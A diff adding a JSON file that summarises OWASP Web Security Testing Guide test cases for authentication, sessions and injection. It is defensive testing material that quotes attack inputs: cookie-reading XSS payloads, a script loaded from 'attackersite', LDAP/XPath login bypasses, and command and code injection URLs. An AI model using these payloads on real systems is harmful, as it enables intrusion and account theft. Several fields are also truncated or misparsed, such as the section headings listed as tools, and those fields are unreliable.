+        "Mozilla Firefox: Unix/Linux: ~/.cache/mozilla/firefox/ Windows: C:\\Users\\<user_name>\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\<profile-id>\\Cache2\\",
+        "Internet Explorer: C:\\Users\\<user_name>\\AppData\\Local\\Microsoft\\Windows\\INetCache\\ Chrome: Windows: C:\\Users\\<user_name>\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache Unix/Linux: ~/.cache/google-chrome",
+        "Reviewing Cached Information: Firefox provides functionality for viewing cached information, which may be to your beneﬁt as a tester.",
+        "Check Handling for Mobile Browsers: Handling of cache directives may be completely different for mobile browsers.",
+        "Gray-Box Testing: The methodology for testing is equivalent to the black-box case, as in both scenarios testers have full access to the server response headers and to the HTML code."
+      ],
+      "tools": [
+        "Burp",
+        "Burp Suite",
+        "Google",
+        "OWASP ZAP",
+        "ZAP"
+      ],
+      "pages": "158-160"
+    },
+    {
+      "id": "WSTG-ATHN-07",
+      "name": "Testing for Weak Password Policy",
+      "category": "ATHN",
+      "objective": "Determine the resistance of the application against brute force password guessing using available password dictionaries by evaluating the length, complexity, reuse, and aging requirements of passwords.",
+      "how_to_test": [
+        "What characters are permitted and forbidden for use within a password? Is the user required to use characters",
+        "How often can a user change their password? How quickly can a user change their password after a previous",
+        "When must a user change their password?",
+        "How often can a user reuse a password? Does the application maintain a history of the user’s previous used 8",
+        "How different must the next password be from the last password?",
+        "Is the user prevented from using his username or other account information (such as ﬁrst or last name) in the",
+        "What are the minimum and maximum password lengths that can be set, and are they appropriate for the sensitivity",
+        "Is it possible set common passwords such as Password1 or 123456?"
+      ],
+      "tools": [],
+      "pages": "161-161"
+    },
+    {
+      "id": "WSTG-ATHN-08",
+      "name": "Testing for Weak Security Question Answer",
+      "category": "ATHN",
+      "objective": "Determine the complexity and how straight-forward the questions are. Assess possible user answers and brute force capabilities.",
+      "how_to_test": [
+        "Testing for Weak Pre-generated Questions: Try to obtain a list of security questions by creating a new account or by following the “I don’t remember my password”- process.",
+        "Testing for Weak Self-Generated Questions: Try to create security questions by creating a new account or by conﬁguring your existing account’s password recovery properties.",
+        "Testing for Brute-forcible Answers: Use the methods described in Testing for Weak lock out mechanism to determine if a number of incorrectly supplied security answers trigger a lockout mechanism."
+      ],
+      "tools": [
+        "Google"
+      ],
+      "pages": "162-163"
+    },
+    {
+      "id": "WSTG-ATHN-09",
+      "name": "Testing for Weak Password Change or Reset Functionalities",
+      "category": "ATHN",
+      "objective": "Determine the resistance of the application to subversion of the account change process allowing someone to change the password of an account. Determine the resistance of the passwords reset functionality against guessing or bypassing.",
+      "how_to_test": [
+        "if users, other than administrators, can change or reset passwords for accounts other than their own.",
+        "if users can manipulate or subvert the password change or reset process to change or reset the password of",
+        "if the password change or reset process is vulnerable to CSRF."
+      ],
+      "tools": [],
+      "pages": "164-165"
+    },
+    {
+      "id": "WSTG-ATHN-10",
+      "name": "Testing for Weaker Authentication in Alternative Channel",
+      "category": "ATHN",
+      "objective": "Identify alternative authentication channels. Assess the security measures used and if any bypasses exists on the alternative channels.",
+      "how_to_test": [
+        "Understand the Primary Mechanism: Fully test the website’s primary authentication functions.",
+        "Identify Other Channels: Other channels can be found by using the following methods: Reading site content, especially the home page, contact us, help pages, support articles and FAQs, T&Cs, privacy notices, the robots.txt ﬁle and any sitemap.xml ﬁles.",
+        "Enumerate Authentication Functionality: For each alternative channel where user accounts or functionality are shared, identify if all the authentication functions of the primary channel are available, and if anything extra exists.",
+        "Primary Mobile Call Center Partner Website",
+        "Register Yes - -",
+        "Log in Yes Yes Yes(SSO): Log out - - -",
+        "Password reset Yes Yes -: - Change password - - In this example, mobile has an extra function “change password” but does not offer “log out”.",
+        "Review and Test: Alternative channels should be mentioned in the testing report, even if they are marked as “information only” or “out of scope”."
+      ],
+      "tools": [],
+      "pages": "166-169"
+    },
+    {
+      "id": "WSTG-ATHZ-01",
+      "name": "Testing Directory Traversal File Include",
+      "category": "ATHZ",
+      "objective": "Identify injection points that pertain to path traversal. Assess bypassing techniques and identify the extent of path traversal.",
+      "how_to_test": [
+        "Black-Box Testing",
+        "Input Vectors Enumeration: In order to determine which part of the application is vulnerable to input validation bypassing, the tester needs to enumerate all parts of the application that accept content from the user.",
+        "Testing Techniques: The next stage of testing is analyzing the input validation functions present in the web application.",
+        "Unix-like OS: root directory: / directory separator: /",
+        "Windows OS: root directory: <drive letter>: directory separator: \\ or /",
+        "Classic macOS: root directory: <drive letter>: directory separator: : We should take in to account the following character encoding mechanisms: URL encoding and double URL encoding %2e%2e%2f represents ../ %2e%2e/ represents ../ ..%2f represents ../ %2e%2e%5c represents ..\\ %2e%2e\\ represents ..\\ ..",
+        "Gray-Box Testing: When the analysis is performed with a gray-box testing approach, testers have to follow the same methodology as in black-box testing."
+      ],
+      "tools": [
+        "Burp",
+        "Burp Suite",
+        "DirBuster",
+        "DotDotPwn",
+        "Enconding/Decoding tools",
+        "OWASP ZAP",
+        "String searcher “grep",
+        "WFuzz",
+        "ZAP"
+      ],
+      "pages": "170-174"
+    },
+    {
+      "id": "WSTG-ATHZ-02",
+      "name": "Testing for Bypassing Authorization Schema",
+      "category": "ATHZ",
+      "objective": "Assess if horizontal or vertical access is possible.",
+      "how_to_test": [
+        "For each role: 1.",
+        "HTTP1.1 200 OK: [other HTTP headers] { \"username\": \"example_user\", \"email\": \"example@email.com\", \"address\": \"Example Address\" } The attacker may try and execute that request with the same username parameter: POST /account/viewCCpincode HTTP/1.1 Host: www.example.com [other HTTP headers] Cookie: Sess",
+        "ROLE PERMISSION ADDITIONAL PERMISSION",
+        "Manager Modify, Add, Read Add",
+        "Customer Read Only: The application will be considered vulnerable if the: 1.",
+        "The valid response: HTTP/1.1 200 OK [other HTTP headers] {\"message\": \"Event was deleted\"} The attacker may try and execute the same request: POST /account/deleteEvent HTTP/1.1 Host: www.example.com [other HTTP headers] Cookie: SessionID=CUSTOMER_USER_SESSION EventID=1000002 If the response of the at",
+        "Testing for Access to Administrative Functions: For example, suppose that the addUser function is part of the administrative menu of the application, and it is possible to access it by requesting the following URL https://www.example.com/admin/addUser.",
+        "Testing for Special Request Header Handling: Some applications support non-standard headers such as X-Original-URL or X-Rewrite-URL in order to allow overriding the target URL in requests with the one speciﬁed in the header value."
+      ],
+      "tools": [
+        "Burp",
+        "Burp extension",
+        "Burp Suite",
+        "ZAP",
+        "ZAP add-on"
+      ],
+      "pages": "175-179"
+    },
+    {
+      "id": "WSTG-ATHZ-03",
+      "name": "Testing for Privilege Escalation",
+      "category": "ATHZ",
+      "objective": "Identify injection points related to privilege manipulation. Fuzz or otherwise attempt to bypass security measures.",
+      "how_to_test": [
+        "Testing for Role/Privilege Manipulation: In every portion of the application where a user can create information in the database (e.g., making a payment, adding a contact, or sending a message), can receive information (statement of account, order details, etc.), or delete information (drop users, m",
+        "Manipulation of User Group: For example: The following HTTP POST allows the user that belongs to grp001 to access order #0001: POST /user/viewOrder.jsp HTTP/1.1 Host: www.example.com ...",
+        "Manipulation of User Proﬁle: For example: The following server’s answer shows a hidden ﬁeld in the HTML returned to the user after a successful authentication.",
+        "Manager`0`0`0` StateToolsBar`0`0`0`: StateExecToolBar`0`0`0`FlagsToolBar`0 The server gives an implicit trust to the user.",
+        "Manipulation of IP Address: Some websites limit access or count the number of failed login attempts based on IP address.",
+        "For example: X-Forwarded-For: 8.1.1.1 In this case, if the website uses the value of X-forwarded-For as client IP address, tester may change the IP value of the X-forwarded-For HTTP header to workaround the IP source identiﬁcation.",
+        "For example: /../.././userInfo.html WhiteBox If the URL authorization check is only done by partial URL match, then it’s likely testers or hackers may workaround the authorization by URL encoding techniques.",
+        "For example: startswith(), endswith(), contains(), indexOf()"
+      ],
+      "tools": [
+        "ZAP"
+      ],
+      "pages": "180-182"
+    },
+    {
+      "id": "WSTG-ATHZ-04",
+      "name": "Testing for Insecure Direct Object References",
+      "category": "ATHZ",
+      "objective": "Identify points where object references may occur. Assess the access control measures and if they’re vulnerable to IDOR.",
+      "how_to_test": [
+        "Sample request: http://foo.bar/somepage?invoice=12345 In this case, the value of the invoice parameter is used as an index in an invoices table in the database.",
+        "Sample request: http://foo.bar/changepassword?user=someuser In this case, the value of the user parameter is used to tell the application for which user it should change the password.",
+        "Sample request: http://foo.bar/showImage?img=img00011 In this case, the value of the file parameter is used to tell the application what ﬁle the user intends to retrieve.",
+        "The Value of a Parameter Is Used Directly to Access Application Functionality",
+        "Sample request: http://foo.bar/accessPage?menuitem=12 In this case, the value of the menuitem parameter is used to tell the application which menu item (and therefore which application functionality) the user is attempting to access."
+      ],
+      "tools": [],
+      "pages": "183-185"
+    },
+    {
+      "id": "WSTG-SESS-01",
+      "name": "Testing for Session Management Schema",
+      "category": "SESS",
+      "objective": "Gather session tokens, for the same user and for different users where possible. Analyze and ensure that enough randomness exists to stop session forging attacks. Modify cookies that are not signed and contain information that can be manipulated.",
+      "how_to_test": [
+        "Black-Box Testing and Examples: All interaction between the client and application should be tested at least against the following criteria",
+        "Are any Cookies persistent?: What Expires times are used on persistent cookies, and are they reasonable?",
+        "Session Analysis: The session tokens (Cookie, SessionID or Hidden Field) themselves should be examined to ensure their quality from a security perspective.",
+        "Session ID Predictability and Randomness: Analysis of the variable areas (if any) of the Session ID should be undertaken to establish the existence of any recognizable or predictable patterns.",
+        "ID – hexadecimal: CR – small integer TM and LM – large integer.",
+        "Brute Force Attacks: Brute force attacks inevitably lead on from questions relating to predictability and randomness.",
+        "Random Session Token: The Session ID or Cookie issued to the client should not be easily predictable (don’t use linear algorithms based on predictable variables such as the client IP address).",
+        "Session Time-out: Session token should have a deﬁned time-out (it depends on the criticality of the application managed data)"
+      ],
+      "tools": [
+        "Burp",
+        "Burp Sequencer",
+        "YEHG’s JHijack",
+        "ZAP"
+      ],
+      "pages": "186-191"
+    },
+    {
+      "id": "WSTG-SESS-02",
+      "name": "Testing for Cookies Attributes",
+      "category": "SESS",
+      "objective": "Ensure that the proper security conﬁguration is set for cookies.",
+      "how_to_test": [
+        "Cookie Attributes",
+        "Secure Attribute: The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS.",
+        "Domain Attribute: The Domain attribute is used to compare the cookie’s domain against the domain of the server for which the HTTP request is being made.",
+        "Expires Attribute: The Expires attribute is used to: set persistent cookies limit lifespan if a session lives for too long remove a cookie forcefully by setting it to a past date Unlike session cookies, persistent cookies will be used by the browser until the cookie expires.",
+        "Strict Value: The Strict value is the most restrictive usage of SameSite, allowing the browser to send the cookie only to ﬁrst-party context without top-level navigation.",
+        "Lax Value: The Lax value is less restrictive than Strict.",
+        "Cookie Preﬁxes: By design cookies do not have the capabilities to guarantee the integrity and conﬁdentiality of the information stored in them.",
+        "Secure Preﬁx: The __Secure- preﬁx is less restrictive and can be introduced by adding the case-sensitive string __Secure- to the cookie name."
+      ],
+      "tools": [
+        "Browser Plug-in",
+        "Burp",
+        "Burp Suite",
+        "EditThisCookie” for Chrome",
+        "FireSheep” for FireFox",
+        "Tamper Data"
+      ],
+      "pages": "192-195"
+    },
+    {
+      "id": "WSTG-SESS-03",
+      "name": "Testing for Session Fixation",
+      "category": "SESS",
+      "objective": "Analyze the authentication mechanism and its ﬂow. Force cookies and assess the impact.",
+      "how_to_test": [
+        "Reach the login page of the website.",
+        "Save a snapshot of the cookie jar before logging in, excluding cookies which contain the __Host- or __Secure-",
+        "Login to the website as the victim and reach any page offering a secure function requiring authentication.",
+        "Trigger the secure function identiﬁed at step 3.",
+        "Observe whether the operation at step 5 has been performed successfully. If so, the attack was successful.",
+        "Clear the cookie jar, login as the attacker and reach the page at step 3.",
+        "Trigger again the secure function identiﬁed at step 3.",
+        "Clear the cookie jar and login again as the victim."
+      ],
+      "tools": [
+        "OWASP ZAP",
+        "ZAP"
+      ],
+      "pages": "196-198"
+    },
+    {
+      "id": "WSTG-SESS-04",
+      "name": "Testing for Exposed Session Variables",
+      "category": "SESS",
+      "objective": "Ensure that proper encryption is implemented. Review the caching conﬁguration. Assess the channel and methods’ security.",
+      "how_to_test": [
+        "Testing for Encryption & Reuse of Session Tokens Vulnerabilities: Protection from eavesdropping is often provided by SSL encryption, but may incorporate other tunneling or encryption.",
+        "Testing for Proxies & Caching Vulnerabilities: Proxies must also be considered when reviewing application security.",
+        "Testing for Transport Vulnerabilities: All interaction between the Client and Application should be tested at least against the following criteria."
+      ],
+      "tools": [],
+      "pages": "199-201"
+    },
+    {
+      "id": "WSTG-SESS-05",
+      "name": "Testing for Cross Site Request Forgery",
+      "category": "SESS",
+      "objective": "Determine whether it is possible to initiate requests on a user’s behalf that are not initiated by the user.",
+      "how_to_test": [
+        "Create an HTML page similar to that shown below",
+        "Host the HTML on a malicious or third-party site",
+        "Send the link for the page to the victim(s) and induce them to click it."
+      ],
+      "tools": [
+        "CSRF Tester",
+        "OWASP ZAP",
+        "Pinata-csrf-tool",
+        "ZAP"
+      ],
+      "pages": "202-207"
+    },
+    {
+      "id": "WSTG-SESS-06",
+      "name": "Testing for Logout Functionality",
+      "category": "SESS",
+      "objective": "Assess the logout UI. Analyze the session timeout and if the session is properly killed after logout.",
+      "how_to_test": [
+        "Testing for Log Out User Interface: Verify the appearance and visibility of the log out functionality in the user interface.",
+        "Testing for Server-Side Session Termination: First, store the values of cookies that are used to identify a session.",
+        "Testing for Session Timeout: Try to determine a session timeout by performing requests to a page in the authenticated area of the web application with increasing delays.",
+        "Testing for Session Termination in Single Sign-On Environments (Single Sign-Off): Perform a log out in the tested application."
+      ],
+      "tools": [
+        "Burp",
+        "Burp Suite"
+      ],
+      "pages": "208-210"
+    },
+    {
+      "id": "WSTG-SESS-07",
+      "name": "Testing Session Timeout",
+      "category": "SESS",
+      "objective": "Validate that a hard session timeout exists.",
+      "how_to_test": [
+        "Black-Box Testing The same approach seen in the Testing for logout functionality section can be applied when measuring the timeout log out.",
+        "The testing methodology is very similar.",
+        "First, testers have to check whether a timeout exists, for instance, by logging in and waiting for the timeout log out to be triggered.",
+        "As in the log out function, after the timeout has passed, all session tokens should be destroyed or be unusable.",
+        "Then, if the timeout is conﬁgured, testers need to understand whether the timeout is enforced by the client or by the server (or both).",
+        "If the session cookie is non-persistent (or, more in general, the session cookie does not store any data about the time), testers can assume that the timeout is enforced by the server.",
+        "If the session cookie contains some time related data (e.g., log in time, or last access time, or expiration date for a persistent cookie), then it’s possible that the client is involved in the timeout enforcing.",
+        "In this case, testers could try to modify the cookie (if it’s not cryptographically protected) and see what happens to the session."
+      ],
+      "tools": [],
+      "pages": "211-212"
+    },
+    {
+      "id": "WSTG-SESS-08",
+      "name": "Testing for Session Puzzling",
+      "category": "SESS",
+      "objective": "Identify all session variables. Break the logical ﬂow of session generation.",
+      "how_to_test": [
+        "Black-Box Testing This vulnerability can be detected and exploited by enumerating all of the session variables used by the application and in which context they are valid.",
+        "In particular this is possible by accessing a sequence of entry points and then examining exit points.",
+        "In case of black-box testing this procedure is difﬁcult and requires some luck since every different sequence could lead to a different result.",
+        "Examples A very simple example could be the password reset functionality that, in the entry point, could request the user to provide some identifying information such as the username or the email address.",
+        "This page might then populate the session with these identifying values, which are received directly from the client-side, or obtained from queries or calculations based on the received input.",
+        "At this point there may be some pages in the application that show private data based on this session object.",
+        "In this manner the attacker could bypass the authentication process.",
+        "Gray-Box Testing The most effective way to detect these vulnerabilities is via a source code review."
+      ],
+      "tools": [],
+      "pages": "213-214"
+    },
+    {
+      "id": "WSTG-SESS-09",
+      "name": "Testing for Session Hijacking",
+      "category": "SESS",
+      "objective": "Identify vulnerable session cookies. Hijack vulnerable cookies and assess the risk level.",
+      "how_to_test": [
+        "Login to the website as the victim and reach any page offering a secure function requiring authentication.",
+        "Delete from the cookie jar all the cookies which satisfy any of the following conditions.",
+        "Save a snapshot of the cookie jar.",
+        "Trigger the secure function identiﬁed at step 1.",
+        "Clear the cookie jar, login as the attacker and reach the page at step 1.",
+        "Write in the cookie jar, one by one, the cookies saved at step 3.",
+        "Trigger again the secure function identiﬁed at step 1.",
+        "Clear the cookie jar and login again as the victim."
+      ],
+      "tools": [
+        "4.7.1 Testing",
+        "4.7.10 Testing",
+        "4.7.11 Testing",
+        "4.7.11.1 Testing",
+        "4.7.11.2 Testing",
+        "4.7.12 Testing",
+        "4.7.13 Testing",
+        "4.7.14 Testing",
+        "4.7.15 Testing",
+        "4.7.16 Testing",
+        "4.7.17 Testing",
+        "4.7.18 Testing",
+        "4.7.19 Testing",
+        "4.7.2 Testing",
+        "4.7.3 Testing",
+        "4.7.4 Testing",
+        "4.7.5 Testing",
+        "4.7.5.1 Testing",
+        "4.7.5.2 Testing",
+        "4.7.5.3 Testing",
+        "4.7.5.4 Testing PostgreSQL",
+        "4.7.5.5 Testing",
+        "4.7.5.6 Testing",
+        "4.7.5.7 Testing",
+        "4.7.5.8 Testing",
+        "4.7.6 Testing",
+        "4.7.7 Testing",
+        "4.7.8 Testing",
+        "4.7.9 Testing",
+        "JHijack",
+        "OWASP ZAP",
+        "ZAP"
+      ],
+      "pages": "215-218"
+    },
+    {
+      "id": "WSTG-INPV-01",
+      "name": "Testing for Reflected Cross Site Scripting",
+      "category": "INPV",
+      "objective": "Identify variables that are reﬂected in responses. Assess the input they accept and the encoding that gets applied on return (if any).",
+      "how_to_test": [
+        "Black-Box Testing: A black-box test will include at least three phases",
+        "Detect Input Vectors: Detect input vectors.",
+        "Analyze Input Vectors: Analyze each input vector to detect potential vulnerabilities.",
+        "Check Impact: For each test input attempted in the previous phase, the tester will analyze the result and determine if it represents a vulnerability that has a realistic impact on the web application’s security.",
+        "Example 2: Let’s try other piece of code (link): http://example.com/index.php?user=<script>window.onload = function() {var AllLinks=document.getElementsByTagName(\"a\");AllLinks[0].href = \"http://badexample.com/malicious.exe\";}</script> This produces the following behavior: Figure 4.7.1-3: XSS Example",
+        "Bypass XSS Filters: Reﬂected cross-site scripting attacks are prevented as the web application sanitizes input, a web application ﬁrewall blocks malicious input, or by mechanisms embedded in modern web browsers.",
+        "Following some examples: \"><script >alert(document.cookie)</script > \"><ScRiPt>alert(document.cookie)</ScRiPt> \"%3cscript%3ealert(document.cookie)%3c/script%3e Example 5: Bypassing Non-Recursive Filtering Sometimes the sanitization is applied only once and it is not being performed recursively.",
+        "Attack using HPP: http://example/page.php?param=<script&param=>[...]</&param=script> See the XSS Filter Evasion Cheat Sheet for a more detailed list of ﬁlter evasion techniques."
+      ],
+      "tools": [
+        "Burp",
+        "Burp Proxy",
+        "Hackvertor",
+        "ratproxy",
+        "RSnake",
+        "sensitive detection",
+        "XSS-Proxy",
+        "ZAP"
+      ],
+      "pages": "219-224"
+    },
+    {
+      "id": "WSTG-INPV-02",
+      "name": "Testing for Stored Cross Site Scripting",
+      "category": "INPV",
+      "objective": "Identify stored input that is reﬂected on the client-side. Assess the input they accept and the encoding that gets applied on return (if any).",
+      "how_to_test": [
+        "Black-Box Testing: The process for identifying stored XSS vulnerabilities is similar to the process described during the testing for reﬂected XSS.",
+        "Input Forms: The ﬁrst step is to identify all points where user input is stored into the back-end and then displayed by the application.",
+        "Analyze HTML Code: Input stored by the application is normally used in HTML tags, but it can also be found as part of JavaScript content.",
+        "Leverage Stored XSS with BeEF: Stored XSS can be exploited by advanced JavaScript exploitation frameworks such as BeEF and XSS Proxy.",
+        "Example: BeEF Injection in index2.php: aaa@aa.com\"><script src=http://attackersite/hook.js></script> When the user loads the page index2.php, the script hook.js is executed by the browser.",
+        "File Upload: If the web application allows ﬁle upload, it is important to check if it is possible to upload HTML content.",
+        "Analyze application response(s): Identify presence of input validation controls Access back-end system and check if input is stored and how it is stored Analyze source code and understand how stored input is rendered by the application If source code is available (as in white-box testing), all varia",
+        "PHP ASP JSP: $_GET - HTTP GET variables Request.QueryString - HTTP GET doGet, doPost servlets - HTTP GET and POST $_POST - HTTP POST variables Request.Form - HTTP POST request.getParameter - HTTP GET/POST variables $_REQUEST – HTTP POST, GET and"
+      ],
+      "tools": [
+        "BeEF",
+        "Burp",
+        "Burp Proxy",
+        "Hackvertor",
+        "RSnake",
+        "vulnerabilities",
+        "XSS-Proxy",
+        "ZAP"
+      ],
+      "pages": "225-230"
+    },
+    {
+      "id": "WSTG-INPV-03",
+      "name": "Testing for HTTP Verb Tampering",
+      "category": "INPV",
+      "objective": "This test has been merged into: Test HTTP Methods.",
+      "how_to_test": [
+        "See the merged test for full instructions."
+      ],
+      "tools": [],
+      "pages": "231-231"
+    },
+    {
+      "id": "WSTG-INPV-04",
+      "name": "Testing for HTTP Parameter Pollution",
+      "category": "INPV",
+      "objective": "Identify the backend and the parsing method used. Assess injection points and try bypassing input ﬁlters using HPP.",
+      "how_to_test": [
+        "Submit an HTTP request containing the standard parameter name and value, and record the HTTP response. E.g.",
+        "Replace the parameter value with a tampered value, submit and record the HTTP response. E.g. page?",
+        "Send a new request combining step (1) and (2). Again, save the HTTP response. E.g. page?",
+        "Compare the responses obtained during all previous steps. If the response from (3) is different from (1) and the"
+      ],
+      "tools": [
+        "OWASP ZAP",
+        "ZAP"
+      ],
+      "pages": "232-235"
+    },
+    {
+      "id": "WSTG-INPV-05",
+      "name": "Testing for SQL Injection",
+      "category": "INPV",
+      "objective": "Identify SQL injection points. Assess the severity of the injection and the level of access that can be achieved through it.",
+      "how_to_test": [
+        "Detection Techniques: The ﬁrst step in this test is to understand when the application interacts with a DB Server in order to access some data.",
+        "Consider the following SQL query: SELECT * FROM Users WHERE Username='$username' AND Password='$password' A similar query is generally used from the web application in order to authenticate a user.",
+        "Stacked Queries: Depending on the API which the web application is using and the DBMS (e.g.",
+        "Union Exploitation Technique: The UNION operator is used in SQL injections to join a query, purposely forged by the tester, to the original query.",
+        "Time Delay Exploitation Technique: The time delay exploitation technique is very useful when the tester ﬁnd a Blind SQL Injection situation, in which nothing is known on the outcome of an operation.",
+        "Consider the following SQL Server Stored Procedure: Create procedure get_report @columnamelist varchar(7900)",
+        "Null Bytes: Use null byte (%00) prior to any characters that the ﬁlter is blocking.",
+        "Take MS SQL engine as an example: select 1 The simple SQL statement can be changed as below by using concatenation EXEC('SEL' + 'ECT 1')"
+      ],
+      "tools": [
+        "RIPS",
+        "sqlbftools",
+        "sqlmap",
+        "wfuzz"
+      ],
+      "pages": "236-282"
+    },
+    {
+      "id": "WSTG-INPV-06",
+      "name": "Testing for LDAP Injection",
+      "category": "INPV",
+      "objective": "Identify LDAP injection points. Assess the severity of the injection.",
+      "how_to_test": [
+        "If the application is vulnerable to LDAP injection, it will display some or all of the user’s attributes, depending on the application’s execution ﬂow and the permissions of the LDAP connected user.",
+        "A tester could use a trial-and-error approach, by inserting in the parameter (, |, &, * and the other characters, in order to check the application for errors.",
+        "Example 2: Login If a web application uses LDAP to check user credentials during the login process and it is vulnerable to LDAP injection, it is possible to bypass the authentication check by injecting an always true LDAP query (in a similar way to SQL and XPATH injection ).",
+        "Let’s suppose a web application uses a ﬁlter to match LDAP user/password pair.",
+        "searchlogin= \"(&(uid=\"+user+\")(userpassword={md5}\"+base64(pack(\"h*\"md5(pass)))+\"))\"; By using the following values: user=*)(uid=*))(|(uid=* pass=password the search ﬁlter will results in: searchlogin=\"(&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))\"; which is correct and always true.",
+        "This way, the tester will gain logged-in status as the ﬁrst user in LDAP tree."
+      ],
+      "tools": [
+        "LDAP Browser",
+        "Softerra LDAP Browser"
+      ],
+      "pages": "283-285"
+    },
+    {
+      "id": "WSTG-INPV-07",
+      "name": "Testing for XML Injection",
+      "category": "INPV",
+      "objective": "Identify XML injection points. Assess the types of exploits that can be attained and their severities.",
+      "how_to_test": [
+        "XML metacharacters are: Single quote: ' - When not sanitized, this character could throw an exception during XML parsing, if the injected value is going to be part of an attribute value in a tag.",
+        "So, if: inputValue = foo' is instantiated and then is inserted as the attrib value: <node attrib='foo''/> then, the resulting XML document is not well formed.",
+        "So if: $inputValue = foo\" the substitution gives: <node attrib=\"foo\"\"/> and the resulting XML document is invalid.",
+        "For example: <tagnode>&lt;</tagnode> is well formed and valid, and represents the < ASCII character.",
+        "Tag Injection: Once the ﬁrst step is accomplished, the tester will have some information about the structure of the XML document.",
+        "Source Code Review: The following Java API may be vulnerable to XXE if they are not conﬁgured properly.",
+        "XML External Entity (XXE) Prevention Cheat Sheet: In addition, the Java POI ofﬁce reader may be vulnerable to XXE if the version is under 3.10.1."
+      ],
+      "tools": [
+        "wfuzz"
+      ],
+      "pages": "286-293"
+    },
+    {
+      "id": "WSTG-INPV-08",
+      "name": "Testing for SSI Injection",
+      "category": "INPV",
+      "objective": "Identify SSI injection points. Assess the severity of the injection.",
+      "how_to_test": [
+        "To test for exploitable SSI, inject SSI directives as user input.",
+        "If SSI are enabled and user input validation has not been properly implemented, the server will execute the directive.",
+        "This is very similar to a classical scripting language injection vulnerability in that it occurs when user input is not properly validated and sanitized.",
+        "First determine if the web server supports SSI directives.",
+        "Often, the answer is yes, as SSI support is quite common.",
+        "To determine if SSI directives are supported, discover the type of web server that the target is running using information gathering techniques (see Fingerprint Web Server).",
+        "If you have access to the code, determine if SSI directives are used by searching through the webserver conﬁguration ﬁles for speciﬁc keywords.",
+        "Another way of verifying that SSI directives are enabled is by checking for pages with the .shtml extension, which is associated with SSI directives."
+      ],
+      "tools": [
+        "Burp",
+        "Burp Suite",
+        "OWASP ZAP",
+        "String searcher",
+        "ZAP"
+      ],
+      "pages": "294-295"
+    },
+    {
+      "id": "WSTG-INPV-09",
+      "name": "Testing for XPath Injection",
+      "category": "INPV",
+      "objective": "Identify XPATH injection points.",
+      "how_to_test": [
+        "The XPath attack pattern was ﬁrst published by Amit Klein and is very similar to the usual SQL Injection.",
+        "In order to get a ﬁrst grasp of the problem, let’s imagine a login page that manages the authentication to an application in which the user must enter their username and password.",
+        "For instance, the tester could input the following values: Username: ' or '1' = '1 Password: ' or '1' = '1 Looks quite familiar, doesn’t it?",
+        "And as in a common SQL Injection attack, with XPath injection, the ﬁrst step is to insert a single quote ( ') in the ﬁeld to be tested, introducing a syntax error in the query, and to check whether the application returns an error message.",
+        "If there is no knowledge about the XML data internal details and if the application does not provide useful error messages that help us reconstruct its internal logic, it is possible to perform a Blind XPath Injection attack, whose goal is to reconstruct the whole data structure.",
+        "The technique is similar to inference based SQL Injection, as the approach is to inject code that creates a query that returns one bit of information.",
+        "Blind XPath Injection is explained in more detail by Amit Klein in the referenced paper."
+      ],
+      "tools": [],
+      "pages": "296-297"
+    },
+    {
+      "id": "WSTG-INPV-10",
+      "name": "Testing for IMAP SMTP Injection",
+      "category": "INPV",
+      "objective": "Identify IMAP/SMTP injection points. Understand the data ﬂow and deployment structure of the system. Assess the injection impacts.",
+      "how_to_test": [
+        "Identifying Vulnerable Parameters: In order to detect vulnerable parameters, the tester has to analyze the application’s ability in handling input.",
+        "On the IMAP server On the SMTP server",
+        "Disconnection Message body",
+        "Eliminate the parameter: http://<webmail>/src/read_body.php?passed_id=46106&startMessage=1 The ﬁnal result of the above testing gives the tester three possible situations: S1 - The application returns a error code/message S2 - The application does not return an error code/message, but it does not re",
+        "Understanding the Data Flow and Deployment Structure of the Client: After identifying all vulnerable parameters (for example, passed_id), the tester needs to determine what level of injection is possible and then design a testing plan to further exploit the application.",
+        "List of IMAP/SMTP commands affected: Type, value, and number of parameters expected by the affected IMAP/SMTP commands",
+        "FETCH 4791 BODY[HEADER]: In this scenario, the IMAP injection structure would be: http://<webmail>/read_email.php?message_id=4791 BODY[HEADER]%0d%0aV100 CAPABILITY%0d%0aV101 FETCH 4791 Which would generate the following commands: ????",
+        "List of IMAP/SMTP commands affected"
+      ],
+      "tools": [],
+      "pages": "298-302"
+    },
+    {
+      "id": "WSTG-INPV-11",
+      "name": "Testing for Code Injection",
+      "category": "INPV",
+      "objective": "Identify injection points where you can inject code into the application. Assess the injection severity.",
+      "how_to_test": [
+        "Black-Box Testing",
+        "Testing for PHP Injection Vulnerabilities: Using the querystring, the tester can inject code (in this example, a malicious URL) to be processed as part of the included ﬁle: http://www.example.com/uptime.php?pin=http://www.example2.com/packx1/cs.jpg?&cmd=uname%20-a The malicious URL is accepted as a ",
+        "Gray-Box Testing",
+        "Testing for ASP Code Injection Vulnerabilities: Examine ASP code for user input used in execution functions.",
+        "Dim fso, f: 'User input Data is written to a file named data.txt Set fso = CreateObject(\"Scripting.FileSystemObject\") Set f = fso.OpenTextFile(Server.MapPath( \"data.txt\" ), 8, True) f.Write Request(\"Data\") & vbCrLf f.close Set f = nothing Set fso = Nothing 'Data.txt is executed",
+        "Server.Execute( \"data.txt\" ): Else %> <form> <input name=\"Data\" /><input type=\"submit\" name=\"Enter Data\" /> </form>"
+      ],
+      "tools": [
+        "kadimus",
+        "LFI Suite",
+        "ZAP"
+      ],
+      "pages": "303-309"
+    },
+    {
+      "id": "WSTG-INPV-12",
+      "name": "Testing for Command Injection",
+      "category": "INPV",
+      "objective": "Identify and assess the command injection points.",
+      "how_to_test": [
+        "Example URL before alteration: http://sensitive/cgi-bin/userData.pl?doc=user1.txt",
+        "Example URL modiﬁed: http://sensitive/cgi-bin/userData.pl?doc=/bin/ls| This will execute the command /bin/ls.",
+        "Doc: 11/11/2006 17:25",
+        "Documents and Settings: 25/10/2006 03:11 I386 14/11/2006 18:51 h4ck3r 30/09/2005 21:40 25,934 OWASP1.JPG 03/11/2006 18:29 Prog 18/11/2006 11:20",
+        "Program Files: 16/11/2006 21:12 Software 24/10/2006 18:25 Setup 24/10/2006 23:37 Technologies 18/11/2006 11:14 3 File 32,496 byte 13 Directory 6,921,269,248 byte disponibili Return code: 0 In this case, we have successfully performed an OS injection attack.",
+        "Special Characters for Comand Injection: The following special character can be used for command injection such as | ; & $ > < ' !",
